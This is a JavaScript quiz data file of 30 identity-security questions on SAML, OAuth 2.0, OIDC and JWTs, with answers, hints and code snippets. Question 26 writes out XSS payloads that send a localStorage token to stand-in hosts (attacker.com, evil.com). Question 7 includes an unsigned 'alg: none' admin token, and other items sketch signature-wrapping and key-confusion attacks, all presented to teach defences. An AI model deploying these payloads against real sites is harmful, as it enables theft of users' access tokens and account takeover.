const questions = [
  {
    id: 1,
    question: "What is the primary architectural difference between SAML 2.0, OAuth 2.0, and OpenID Connect (OIDC)?",
    shortAnswer: "SAML 2.0: Enterprise XML-based protocol for user authentication and Web Browser SSO. OAuth 2.0: Delegated authorization framework for API resource access. OpenID Connect (OIDC): Identity/Authentication layer built directly on top of OAuth 2.0 using JSON and JWTs.",
    explanation: "OAuth 2.0 grants API access (authorization); OIDC asserts user identity (authentication); SAML federates enterprise web logins.",
    hint: "SAML = Enterprise XML SSO; OAuth = API Authorization; OIDC = Identity layer over OAuth using JWTs.",
    level: "Basic",
    codeExample: `// Protocol Essence:
// SAML 2.0 : <saml:Assertion> (XML-based enterprise SSO)
// OAuth 2.0: Access Token (Grants API authorization)
// OIDC     : ID Token (JWT asserting user identity)`
  },
  {
    id: 2,
    question: "Why is OAuth 2.0 fundamentally NOT an authentication protocol by itself?",
    shortAnswer: "Because an OAuth 2.0 Access Token is an opaque or structured string representing delegated API permissions (scopes), containing no standard information about who the user is, when they authenticated, or how they verified their identity.",
    explanation: "Using raw OAuth 2.0 for authentication leads to security flaws; OpenID Connect was explicitly created to provide standardized user identity assertion.",
    hint: "Access tokens represent API permissions (scopes), not verified user identity or authentication timestamps.",
    level: "Basic",
    codeExample: `// OAuth 2.0 Access Token:
// { "access_token": "ya29.a0AfH6...", "token_type": "Bearer", "expires_in": 3600 }
// Notice: No user ID, no email, no auth timestamp!`
  },
  {
    id: 3,
    question: "What is the structure of a JSON Web Token (JWT - RFC 7519) in OpenID Connect?",
    shortAnswer: "A JWT consists of three Base64URL-encoded parts separated by periods: 1. Header (Algorithm & Token Type); 2. Payload (Claims: iss, sub, aud, exp, iat, nonce); 3. Signature (HMAC or Digital Signature over Header.Payload).",
    explanation: "Format: `Base64URL(Header) . Base64URL(Payload) . Base64URL(Signature)`.",
    hint: "Three Base64URL parts: Header, Payload (claims), and Signature separated by dots.",
    level: "Basic",
    codeExample: `// JWT Structure:
// eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDQ4MiIsImVtYWlsIjoic3VzbWl0YUBiYW5rLmluIn0.k8F9a...
// Header . Payload . Signature`
  },
  {
    id: 4,
    question: "Explain the standard JWT payload claims: `iss`, `sub`, `aud`, `exp`, `iat`, and `nonce`.",
    shortAnswer: "`iss` (Issuer URL); `sub` (Subject / Unique User ID); `aud` (Audience / Client ID of intended recipient app); `exp` (Expiration Unix timestamp); `iat` (Issued At timestamp); `nonce` (Cryptographic random string preventing replay attacks).",
    explanation: "Relying parties must validate all of these claims to ensure token integrity and freshness.",
    hint: "iss=Issuer, sub=User ID, aud=Target App, exp=Expiry, nonce=Anti-replay string.",
    level: "Moderate",
    codeExample: `// JWT Claims Payload:
// {
//   "iss": "https://idp.barrackpore.gov.in",
//   "sub": "user_9812",
//   "aud": "treasury_portal_client",
//   "exp": 1774829100,
//   "nonce": "e8f7a1b2c3"
// }`
  },
  {
    id: 5,
    question: "How does Proof Key for Code Exchange (PKCE - RFC 7636) secure the OAuth 2.0 Authorization Code flow on public mobile and single-page apps?",
    shortAnswer: "The client creates a random `code_verifier` and computes `code_challenge = BASE64URL(SHA256(code_verifier))`. The challenge is sent during the authorization request. When exchanging the authorization code at `/token`, the client transmits the verifier. The server verifies the SHA256 match, blocking rogue apps that intercepted the code from redeeming it.",
    explanation: "PKCE prevents authorization code injection and interception attacks on devices where client secrets cannot be securely stored.",
    hint: "Client sends a hash of a random verifier initially, and reveals the secret verifier only at the token endpoint.",
    level: "Expert",
    codeExample: `// PKCE Math:
// 1. code_verifier  = 43-128 random chars
// 2. code_challenge = Base64URL(SHA256(code_verifier))
// 3. /authorize?code_challenge=xyz&code_challenge_method=S256
// 4. /token?code=auth_123&code_verifier=secret_verifier`
  },
  {
    id: 6,
    question: "What is XML Signature Wrapping (XSW) in SAML 2.0 and how do attackers exploit it?",
    shortAnswer: "An attacker intercepts a legitimate SAML response, duplicates the signed `<Assertion>` block, and injects an unsigned rogue admin `<Assertion>` into the XML DOM tree. If the XML signature verification engine validates the signed block while the application logic parses the rogue admin block, privilege escalation occurs.",
    explanation: "XSW exploits inconsistencies between XML signature validators and XML DOM tree extractors.",
    hint: "Manipulating the XML DOM tree so the signature verifies one block while the app processes an injected rogue block.",
    level: "Expert",
    codeExample: `// SAML XSW Exploit Architecture:
// <samlp:Response>
//   <saml:Assertion ID="rogue_admin"> (Processed by Application Logic ❌)
//   <saml:Assertion ID="innocent_user"> (Verified by XML Signature ✔)
// </samlp:Response>`
  },
  {
    id: 7,
    question: "What is the JWT `alg: none` vulnerability and how is it remediated?",
    shortAnswer: "The JWT specification permits `alg: none` for unsigned tokens. Vulnerable backend libraries accept tokens where an attacker modifies the header to `{'alg': 'none'}` and removes the signature part, allowing arbitrary privilege escalation. Remediation: Hardcode permitted signing algorithms (e.g., RS256) and reject `none` unconditionally.",
    explanation: "Libraries should never trust the `alg` header parameter supplied by an untrusted client.",
    hint: "Attacker sets alg to none and strips the signature; fixed by enforcing a whitelist of signing algorithms.",
    level: "Moderate",
    codeExample: `// alg: none Vulnerability & Fix:
// Vulnerable Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
// Fix: jwt.verify(token, publicKey, { algorithms: ['RS256', 'ES256'] })`
  },
  {
    id: 8,
    question: "What is JWT Key Confusion (Algorithm Switching: RS256 to HS256)?",
    shortAnswer: "An attacker changes the JWT header from `RS256` (asymmetric RSA) to `HS256` (symmetric HMAC). When the server verifies the token, a flawed library uses the server's public RSA key (which is public knowledge) as the HMAC secret key, allowing the attacker to forge valid arbitrary admin tokens!",
    explanation: "This occurs when generic verification functions accept both symmetric and asymmetric keys interchangeably.",
    hint: "Attacker switches RS256 to HS256 and signs the token using the server's public key as HMAC secret.",
    level: "Expert",
    codeExample: `// Key Confusion Attack:
// Attacker signs: HMAC-SHA256(payload, PUBLIC_RSA_KEY_STRING)
// Flawed Server verifies: HMAC-SHA256(payload, PUBLIC_RSA_KEY_STRING) → VALID! 🚨`
  },
  {
    id: 9,
    question: "What is the difference between SP-Initiated SSO and IdP-Initiated SSO in SAML 2.0?",
    shortAnswer: "SP-Initiated: User visits Service Provider (e.g., Salesforce); SP generates an `<AuthnRequest>` and redirects user to Identity Provider (Okta). IdP-Initiated: User logs into Okta dashboard first and clicks the app icon, sending an unsolicited SAML Response directly to the SP.",
    explanation: "IdP-Initiated SSO is inherently vulnerable to Login CSRF attacks and is deprecated in modern architectures.",
    hint: "SP-Initiated starts at the application; IdP-Initiated starts at the identity provider dashboard.",
    level: "Moderate",
    codeExample: `// Flow Comparison:
// SP-Initiated  : App ➔ Redirects with AuthnRequest ➔ IdP ➔ Returns SAMLResponse ➔ App (Secure ✔)
// IdP-Initiated : IdP Dashboard ➔ Sends unsolicited SAMLResponse ➔ App (Vulnerable to CSRF ⚠️)`
  },
  {
    id: 10,
    question: "What are the roles of the 4 key actors in the OAuth 2.0 framework (RFC 6749)?",
    shortAnswer: "1. Resource Owner (the end user); 2. Client (the third-party application requesting access); 3. Authorization Server (authenticates the user and issues access tokens); 4. Resource Server (the API hosting protected data).",
    explanation: "Decoupling the Authorization Server from the Resource Server enables centralized identity management.",
    hint: "Resource Owner (user), Client (app), Authorization Server (token issuer), Resource Server (API).",
    level: "Basic",
    codeExample: `// OAuth 2.0 Roles:
// Resource Owner   : Susmita
// Client App       : Expense Tracker App
// Auth Server      : https://idp.barrackpore.gov.in
// Resource Server  : https://api.bank.barrackpore.gov.in/v1/accounts`
  },
  {
    id: 11,
    question: "What is an OAuth 2.0 Scope and how does it implement the Principle of Least Privilege?",
    shortAnswer: "Scopes are granular string identifiers (e.g., `read:reports`, `write:payments`) requested by a client that define the specific permissions granted by the access token. The Resource Server enforces that requests only execute actions permitted by the token's active scopes.",
    explanation: "Scopes limit the blast radius if a third-party application's access token is compromised.",
    hint: "Granular permission strings (read:profile, write:orders) restricting what an access token can do.",
    level: "Basic",
    codeExample: `// Scope Request:
// /authorize?scope=openid%20profile%20read:treasury_reports`
  },
  {
    id: 12,
    question: "What is a Refresh Token in OAuth 2.0 and why must it be protected with Refresh Token Rotation?",
    shortAnswer: "A Refresh Token is a long-lived credential used to obtain fresh short-lived Access Tokens without prompting the user. Under Refresh Token Rotation, every time a refresh token is used, the server invalidates it and issues a brand-new refresh token. If an old token is reused, all tokens in the family are revoked.",
    explanation: "Rotation detects and neutralizes token theft immediately upon adversary reuse.",
    hint: "Long-lived credential for renewing access tokens; rotation issues a new refresh token on every use.",
    level: "Moderate",
    codeExample: `// Token Rotation:
// Request: POST /token (refresh_token_1) ➔ Returns (access_token_2, refresh_token_2)
// If refresh_token_1 is reused later ➔ SYSTEM REVOKES ALL TOKENS (BREACH DETECTED 🚨)`
  },
  {
    id: 13,
    question: "What is the JSON Web Key Set (JWKS) endpoint (`/.well-known/jwks.json`) in OpenID Connect?",
    shortAnswer: "JWKS is a public JSON endpoint hosted by the Identity Provider containing the public cryptographic keys used to verify signed JWT ID Tokens and Access Tokens.",
    explanation: "Resource servers cache the JWKS to verify signatures locally at high speed without making round-trip API calls to the IdP for every request.",
    hint: "Public endpoint exposing the Identity Provider's public keys for verifying JWT signatures.",
    level: "Moderate",
    codeExample: `// JWKS JSON Structure:
// {
//   "keys": [
//     { "kty": "RSA", "use": "sig", "kid": "key_2026_01", "n": "u1b7...", "e": "AQAB" }
//   ]
// }`
  },
  {
    id: 14,
    question: "What is OpenID Connect Discovery (`/.well-known/openid-configuration`)?",
    shortAnswer: "An automated JSON discovery document published at a standard URI that advertises all OAuth/OIDC endpoints (authorization_endpoint, token_endpoint, jwks_uri, userinfo_endpoint, supported scopes, and signing algorithms).",
    explanation: "Discovery allows client libraries to automatically configure identity integration by supplying only the base IdP URL.",
    hint: "Standardized JSON document listing all endpoints, scopes, and supported algorithms of an IdP.",
    level: "Basic",
    codeExample: `// OIDC Discovery URL:
// https://idp.barrackpore.gov.in/.well-known/openid-configuration`
  },
  {
    id: 15,
    question: "What is the difference between a Bearer Token and a Proof-of-Possession (DPoP / mTLS) Token?",
    shortAnswer: "Bearer Token: Whoever possesses the token string can use it (like cash). If intercepted by malware, it can be replayed from any computer. DPoP / mTLS Token: Cryptographically bound to the client's private key. The token is useless to an attacker unless they also possess the client's private key.",
    explanation: "Demonstrating Proof-of-Possession (DPoP - RFC 9449) eliminates token replay vulnerabilities across API endpoints.",
    hint: "Bearer tokens work for anyone who has them; DPoP tokens require cryptographic proof of client key possession.",
    level: "Expert",
    codeExample: `// DPoP Header:
// Authorization: DPoP <access_token>
// DPoP: <signed_jwt_proving_possession_of_client_private_key>`
  },
  {
    id: 16,
    question: "How does OpenID Connect Front-Channel Logout vs Back-Channel Logout operate?",
    shortAnswer: "Front-Channel: The IdP renders hidden `<iframe>` tags pointing to each registered application's logout URI in the user's browser. Back-Channel: The IdP sends direct server-to-server HTTP POST requests containing a signed `Logout Token` to each application's backend.",
    explanation: "Back-Channel logout is more reliable because it does not depend on browser cookie policies or blocked third-party iframes.",
    hint: "Front-channel uses browser iframes; Back-channel uses direct server-to-server POST requests.",
    level: "Moderate",
    codeExample: `// Back-Channel Logout Request:
// POST /logout_token HTTP/1.1
// Host: treasury.barrackpore.gov.in
// Content-Type: application/x-www-form-urlencoded
// logout_token=eyJhbGciOiJSUzI1NiJ9...`
  },
  {
    id: 17,
    question: "What is Token Introspection (RFC 7662) in OAuth 2.0?",
    shortAnswer: "An HTTP API endpoint on the Authorization Server (`/introspect`) where Resource Servers query whether an opaque access token is currently active, valid, and what scopes/claims are associated with it.",
    explanation: "Token introspection allows immediate revocation of opaque tokens across distributed microservices.",
    hint: "Resource server queries the authorization server to check if an opaque token is still active.",
    level: "Moderate",
    codeExample: `// Introspection Response:
// { "active": true, "scope": "read:accounts", "client_id": "app_101", "sub": "usr_99" }`
  },
  {
    id: 18,
    question: "What is Token Revocation (RFC 7009)?",
    shortAnswer: "A standardized endpoint (`/revoke`) allowing a client application to explicitly invalidate an active Refresh Token or Access Token when a user logs out, preventing further use.",
    explanation: "Calling revocation ensures tokens cannot be used even if their natural TTL expiration has not yet elapsed.",
    hint: "Explicitly invalidates an access or refresh token upon user logout.",
    level: "Basic",
    codeExample: `// Revocation Request:
// POST /revoke HTTP/1.1
// token=refresh_token_to_destroy&token_type_hint=refresh_token`
  },
  {
    id: 19,
    question: "Why was the OAuth 2.0 Implicit Grant (`response_type=token`) completely deprecated in OAuth 2.1?",
    shortAnswer: "Because it returned access tokens directly in the URL fragment (`#access_token=...`), exposing tokens to browser history, Referer headers, proxy server logs, and malicious browser extensions with zero client authentication.",
    explanation: "OAuth 2.1 mandates the Authorization Code Flow with PKCE for all client types, eliminating the Implicit Grant.",
    hint: "Exposed access tokens in URL hash fragments; replaced by Authorization Code Flow with PKCE.",
    level: "Moderate",
    codeExample: `// Deprecated Implicit Grant:
// Browser Redirect ➔ https://app.com/#access_token=SECRET_BEARER_TOKEN (EXPOSED IN URL! ❌)`
  },
  {
    id: 20,
    question: "How does the OAuth 2.0 `state` parameter protect against Cross-Site Request Forgery (CSRF) attacks during login?",
    shortAnswer: "The client generates a cryptographically random, unguessable string, stores it in an HTTP-only session cookie, and sends it in the `state` query parameter. When the authorization server redirects back, the client compares the returned `state` to the cookie. A mismatch aborts login.",
    explanation: "This prevents an attacker from injecting their own authorization code into an innocent victim's browser session.",
    hint: "Random string stored in session cookie and checked upon redirect to prevent login CSRF.",
    level: "Moderate",
    codeExample: `// CSRF Defense:
// 1. Client creates: state = "9f8a7b6c" (Stored in Session)
// 2. Auth redirect returns: ?code=xyz&state=9f8a7b6c
// 3. Client verifies: session.state === query.state ✔`
  },
  {
    id: 21,
    question: "What is the Client Credentials Grant in OAuth 2.0 and when is it appropriate?",
    shortAnswer: "A machine-to-machine (M2M) flow where a backend daemon service authenticates directly to the Authorization Server using its `client_id` and `client_secret` to obtain an access token with no user context.",
    explanation: "Used exclusively for automated microservice-to-microservice background batch processing.",
    hint: "Machine-to-machine authentication between backend services with no human user involved.",
    level: "Basic",
    codeExample: `// Client Credentials Request:
// POST /token
// grant_type=client_credentials&client_id=daemon_service&client_secret=super_secret`
  },
  {
    id: 22,
    question: "What is SAML Metadata XML and how does it establish mutual trust between an IdP and an SP?",
    shortAnswer: "SAML Metadata is an XML document exchanged between parties containing public X.509 signing/encryption certificates, Entity IDs, Single Sign-On service endpoint URLs, and supported SAML bindings (HTTP-Redirect, HTTP-POST).",
    explanation: "Pre-exchanging metadata establishes the cryptographic trust anchors required to validate XML signatures.",
    hint: "XML file containing X.509 certificates and endpoint URLs establishing trust between IdP and SP.",
    level: "Moderate",
    codeExample: `// SAML Metadata:
// <md:EntityDescriptor entityID="https://idp.barrackpore.gov.in">
//   <md:IDPSSODescriptor ...>
//     <md:KeyDescriptor use="signing"> ... </md:KeyDescriptor>
//   </md:IDPSSODescriptor>
// </md:EntityDescriptor>`
  },
  {
    id: 23,
    question: "How does Session Hijacking of SSO cookies compromise all connected federated enterprise applications?",
    shortAnswer: "In an SSO ecosystem, logging into the central IdP sets a master session cookie (`IdP_Session`). If an attacker steals this master cookie (via XSS or session sniffing), they can silently authenticate to ALL federated enterprise apps without knowing the password.",
    explanation: "Centralized SSO concentrates authentication risk into a single high-value target.",
    hint: "Stealing the master IdP session cookie allows silently logging into every connected corporate application.",
    level: "Moderate",
    codeExample: `// SSO Master Cookie Compromise:
// Attacker steals IdP_Session cookie ➔ Bypasses login on Salesforce, AWS Console, Treasury Portal, and Jira!`
  },
  {
    id: 24,
    question: "What is Continuous Access Evaluation Protocol (CAEP / OpenID Shared Signals and Events)?",
    shortAnswer: "CAEP allows Identity Providers to broadcast real-time security events (e.g., user password reset, device marked compromised, impossible travel detected) to all active Relying Parties, triggering instant session revocation mid-session.",
    explanation: "This eliminates the dangerous window where a compromised user remains active until their access token expires.",
    hint: "Broadcasts real-time security events to instantly revoke active sessions across all apps.",
    level: "Expert",
    codeExample: `// CAEP Event Broadcast:
// IdP detects malware → Dispatches CAEP event: { "event": "session-revoked", "sub": "usr_10482" } → All apps terminate session immediately.`
  },
  {
    id: 25,
    question: "What is Step-Up Authentication in OpenID Connect using the `acr_values` parameter?",
    shortAnswer: "A client application requests a higher level of authentication assurance by passing `acr_values` (Authentication Context Class Reference, e.g., `acr_values=urn:mfa:phishing-resistant`) when redirecting to the IdP for sensitive transactions.",
    explanation: "The IdP prompts for a hardware FIDO2 key or biometric scan before returning an updated ID token with the matching `acr` claim.",
    hint: "Requests a specific authentication assurance level (e.g., phishing-resistant MFA) via acr_values.",
    level: "Moderate",
    codeExample: `// OIDC Step-Up Request:
// /authorize?acr_values=urn:mfa:hardware-fido2`
  },
  {
    id: 26,
    question: "How does Cross-Site Scripting (XSS) allow attackers to exfiltrate Access Tokens stored in `localStorage`?",
    shortAnswer: "`localStorage` is accessible to any JavaScript running in the origin. An injected XSS payload can simply execute `fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))`. Best practice: Store tokens in `HttpOnly, Secure, SameSite=Strict` cookies or in-memory closures with Web Workers.",
    explanation: "`HttpOnly` cookies are inaccessible to JavaScript, completely protecting them from XSS exfiltration.",
    hint: "JavaScript can read localStorage; mitigated by storing tokens in HttpOnly cookies.",
    level: "Basic",
    codeExample: `// XSS Exfiltration:
// <script>new Image().src="http://evil.com/?t="+localStorage.getItem("jwt");</script>`
  },
  {
    id: 27,
    question: "What is OAuth 2.0 Device Authorization Grant (RFC 8628) for Smart TVs and CLI tools?",
    shortAnswer: "For input-constrained devices (Apple TV, CLI tools) with no browser, the device requests a `device_code` and displays a short `user_code` (e.g., 'WDJB-MJHT') and URL ('https://idp.in/activate'). The user enters the code on their smartphone, authorizing the TV session.",
    explanation: "The device polls the token endpoint until the user completes authentication on their phone.",
    hint: "Displays a short code on a TV or terminal for the user to confirm on their phone.",
    level: "Basic",
    codeExample: `// Device Grant:
// Terminal displays: "Visit https://barrackpore.gov.in/device and enter code: FG72-K99L"`
  },
  {
    id: 28,
    question: "What is XML Signature Validation in SAML 2.0 and why must applications verify both Assertion and Response signatures?",
    shortAnswer: "A SAML message contains an outer `<samlp:Response>` and an inner `<saml:Assertion>`. Verifying only the outer Response signature allows an attacker to swap the inner Assertion (or vice versa). Robust implementations verify signatures on BOTH elements.",
    explanation: "Double-verification ensures both the transport envelope and the identity payload have maintained cryptographic integrity.",
    hint: "Verifying both outer Response and inner Assertion elements prevents signature substitution attacks.",
    level: "Expert",
    codeExample: `// Double Signature Requirement:
// Verify: Signature(samlp:Response) && Signature(saml:Assertion)`
  },
  {
    id: 29,
    question: "In a forensic review of an enterprise portal in Salt Lake Sector V, an engineer found that their backend API verified JWT signatures using `jwt.decode()` instead of `jwt.verify()`. What vulnerability existed?",
    shortAnswer: "`jwt.decode()` merely deserializes the Base64URL JSON payload without performing cryptographic signature validation. An adversary could modify their payload to `{'role': 'GLOBAL_ADMIN', 'sub': 'root'}` and submit it; the API accepted the modified claims without verification!",
    explanation: "Desirializing claims without validating the HMAC/RSA signature allows complete identity spoofing.",
    hint: "decode() only parses JSON; verify() cryptographically validates the signature.",
    level: "Moderate",
    codeExample: `// Catastrophic Bug:
// const claims = jwt.decode(token); // VULNERABLE! No signature check ❌
// Fix: const claims = jwt.verify(token, publicKey); // SECURE ✔`
  },
  {
    id: 30,
    question: "Write out the comprehensive architectural blueprint for an enterprise federated identity infrastructure uniting 10,000 employees across SAML, OIDC, and FIDO2.",
    shortAnswer: "1. Deploy a central Identity Provider (Okta / Entra ID) backed by enterprise directory. 2. Enforce FIDO2 WebAuthn with mandatory User Verification at the IdP. 3. Connect legacy web apps via SAML 2.0 SP-initiated SSO. 4. Connect modern SPAs and mobile apps via OIDC Authorization Code Flow with PKCE (S256). 5. Protect microservice APIs using short-lived DPoP-bound JWT access tokens with continuous CAEP revocation.",
    explanation: "This architecture unites legacy and modern cloud assets under a unified, phishing-resistant Zero Trust identity perimeter.",
    hint: "Central IdP with FIDO2 MFA, SAML for legacy apps, OIDC+PKCE for modern apps, and DPoP tokens for APIs.",
    level: "Expert",
    codeExample: `// Enterprise Identity Blueprint:
// [Users] ➔ FIDO2 WebAuthn ➔ [Central IdP]
// [Central IdP] ➔ SAML 2.0 ➔ [Legacy Enterprise Apps]
// [Central IdP] ➔ OIDC + PKCE ➔ [Modern Cloud Apps] ➔ DPoP Tokens ➔ [APIs]`
  }
];

export default questions;
